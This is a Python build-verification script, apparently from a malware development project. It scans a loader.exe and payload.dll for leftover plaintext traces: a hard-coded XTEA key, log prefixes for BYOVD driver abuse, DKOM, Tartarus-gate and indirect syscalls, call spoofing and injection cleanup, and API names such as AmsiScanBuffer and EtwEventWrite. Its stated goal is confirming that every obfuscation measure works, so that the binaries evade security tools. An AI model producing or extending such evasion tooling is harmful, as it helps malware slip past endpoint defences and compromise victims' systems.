#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
BUILD 551 字符串扫描验证脚本
检查 loader.exe / payload.dll 中是否还有明文敏感特征
"""
import sys
import struct

def read_binary(path):
    with open(path, 'rb') as f:
        return f.read()

def find_pattern(data, pattern_bytes, label):
    """在二进制中查找字节模式, 返回所有匹配偏移"""
    offsets = []
    start = 0
    while True:
        idx = data.find(pattern_bytes, start)
        if idx == -1:
            break
        offsets.append(idx)
        start = idx + 1
    return offsets

def find_ascii(data, pattern_str, label):
    """查找 ASCII 字符串"""
    return find_pattern(data, pattern_str.encode('ascii'), label)

def find_utf16le(data, pattern_str, label):
    """查找 UTF-16LE 字符串"""
    return find_pattern(data, pattern_str.encode('utf-16-le'), label)

def scan_file(path, checks):
    print(f"\n{'='*60}")
    print(f"扫描: {path}")
    print(f"{'='*60}")
    data = read_binary(path)
    print(f"文件大小: {len(data):,} bytes")

    found_any = False
    for check in checks:
        kind, pattern, label = check
        if kind == 'ascii':
            offsets = find_ascii(data, pattern, label)
        elif kind == 'utf16le':
            offsets = find_utf16le(data, pattern, label)
        elif kind == 'bytes':
            offsets = find_pattern(data, pattern, label)

        if offsets:
            found_any = True
            print(f"  [!] FOUND {label}: {len(offsets)} 处, 首个偏移 0x{offsets[0]:X}")
            print(f"      pattern = {pattern!r}")
        else:
            print(f"  [OK] {label}: 未发现")

    return found_any

# ---- loader.exe 检查项 ----
loader_checks = [
    # 1. XTEA 明文密钥 (4 个 dword, little-endian)
    ('bytes', struct.pack('<IIII', 0x7B2E1A4F, 0xC9D83560, 0x4A1F93E7, 0xE8056B2C),
     'XTEA 明文密钥 (16字节连续)'),
    # 2. 单独的密钥 dword (可能被分散存放)
    ('bytes', struct.pack('<I', 0x7B2E1A4F), 'XTEA_KEY[0] = 0x7B2E1A4F'),
    ('bytes', struct.pack('<I', 0xC9D83560), 'XTEA_KEY[1] = 0xC9D83560'),
    ('bytes', struct.pack('<I', 0x4A1F93E7), 'XTEA_KEY[2] = 0x4A1F93E7'),
    ('bytes', struct.pack('<I', 0xE8056B2C), 'XTEA_KEY[3] = 0xE8056B2C'),
    # 3. 日志关键字 (DiagLog 在 loader.cpp 中也存在)
    ('ascii', 'BYOVD:', 'BYOVD: 日志前缀'),
    ('ascii', 'DiagLog', 'DiagLog 日志函数名'),
    ('ascii', 'LoaderDiag', 'LoaderDiag 日志函数名'),
    # 4. API 名 (应被 STEALTH_GET_PROC_ADDRESS_NOREF 加密)
    ('ascii', 'NtQuerySystemInformation', 'API: NtQuerySystemInformation'),
    ('ascii', 'EtwEventWrite', 'API: EtwEventWrite'),
    ('ascii', 'AmsiScanBuffer', 'API: AmsiScanBuffer'),
    ('ascii', 'NtSetSecurityObject', 'API: NtSetSecurityObject'),
    ('ascii', 'RtlDeactivateActivationContext', 'API: RtlDeactivateActivationContext'),
    # 5. OpenProcess (应被 STEALTH_OPEN_PROCESS 替换, 但 loader.exe 是 -mwindows 可能仍引用)
    ('ascii', 'OpenProcess', 'OpenProcess API 名 (IAT/字符串)'),
]

# ---- payload.dll 检查项 ----
payload_checks = [
    # 1. 日志关键字 (应被 NDEBUG 条件编译消除)
    ('ascii', 'BYOVD:', 'BYOVD: 日志前缀'),
    ('ascii', 'VERIFY:', 'VERIFY: 日志前缀'),
    ('ascii', 'FLT:', 'FLT: 日志前缀'),
    ('ascii', 'DKOM:', 'DKOM: 日志前缀'),
    ('ascii', 'TRACE:', 'TRACE: 日志前缀'),
    ('ascii', 'B549:', 'B549: 日志前缀'),
    ('ascii', 'B550:', 'B550: 日志前缀'),
    ('ascii', 'VEH-SELFHEAL:', 'VEH-SELFHEAL: 日志前缀'),
    ('ascii', 'TARTARUS:', 'TARTARUS: 日志前缀'),
    ('ascii', 'INDIRECT:', 'INDIRECT: 日志前缀'),
    ('ascii', 'SPOOF:', 'SPOOF: 日志前缀'),
    ('ascii', 'GPA:', 'GPA: 日志前缀'),
    ('ascii', 'DllMain:', 'DllMain: 日志前缀'),
    ('ascii', 'E+G:', 'E+G: 日志前缀'),
    ('ascii', 'CleanupInjectionTraces:', 'CleanupInjectionTraces: 日志前缀'),
    ('ascii', 'EnumerateProcesses:', 'EnumerateProcesses: 日志前缀'),
    ('ascii', 'GetProcessModules:', 'GetProcessModules: 日志前缀'),
    # 2. Diag 函数名 (NDEBUG 下应消除)
    ('ascii', 'ByovdDiag', 'ByovdDiag 函数名'),
    ('ascii', 'DiagLog', 'DiagLog 函数名'),
    ('ascii', 'ProcDiag', 'ProcDiag 函数名'),
    # 3. API 名 (应被 STEALTH_GET_PROC_ADDRESS_NOREF 加密)
    ('ascii', 'NtQuerySystemInformation', 'API: NtQuerySystemInformation'),
    ('ascii', 'EtwEventWrite', 'API: EtwEventWrite'),
    ('ascii', 'AmsiScanBuffer', 'API: AmsiScanBuffer'),
    ('ascii', 'NtSetSecurityObject', 'API: NtSetSecurityObject'),
    ('ascii', 'RtlDeactivateActivationContext', 'API: RtlDeactivateActivationContext'),
    ('ascii', 'LoadLibraryA', 'API: LoadLibraryA (应被加密解析)'),
    # 4. OpenProcess (应被 STEALTH_OPEN_PROCESS 替换)
    ('ascii', 'OpenProcess', 'OpenProcess API 名 (IAT/字符串)'),
]

print("BUILD 551 字符串扫描验证")
print("="*60)
print("目标: 确认所有混淆/消除策略生效, 二进制中无明文敏感特征")

problems = 0
problems += 1 if scan_file(r'd:\技术研发\tmp\loader.exe', loader_checks) else 0
problems += 1 if scan_file(r'd:\技术研发\tmp\payload.dll', payload_checks) else 0

print(f"\n{'='*60}")
print(f"扫描总结")
print(f"{'='*60}")
if problems == 0:
    print("[OK] 所有关键特征已消除, BUILD 551 混淆策略全部生效!")
else:
    print(f"[!] {problems} 个文件仍有敏感特征残留, 需进一步排查")
sys.exit(problems)
